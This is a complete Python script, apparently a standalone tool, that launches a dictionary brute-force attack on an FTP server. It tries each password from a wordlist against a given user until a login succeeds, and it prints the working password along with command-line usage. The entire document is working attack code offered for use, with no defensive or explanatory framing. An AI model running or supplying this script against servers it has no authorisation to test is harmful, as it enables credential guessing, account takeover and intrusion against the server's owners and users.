# Attacks a FTP server with a dictionary attack
# Usage: ftp_bruteforce.py <target> <user> <dictionary>

import ftplib
import sys

def ftp_bruteforce(target, user, dictionary):
    with open(dictionary, "r") as file: # Open the dictionary file
        for password in file:
            password = password.strip("\n") # Remove the newline character
            try:
                ftp = ftplib.FTP(target) # Connect to the FTP server
                ftp.login(user, password) # Try to login with the credentials
                print(f"Password found: {password}")
                break
            except ftplib.error_perm: # If the login fails, continue the loop
                continue
        else:
            print("Password not found")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: ftp_bruteforce.py <target> <user> <dictionary>")
        sys.exit(1)
    ftp_bruteforce(sys.argv[1], sys.argv[2], sys.argv[3])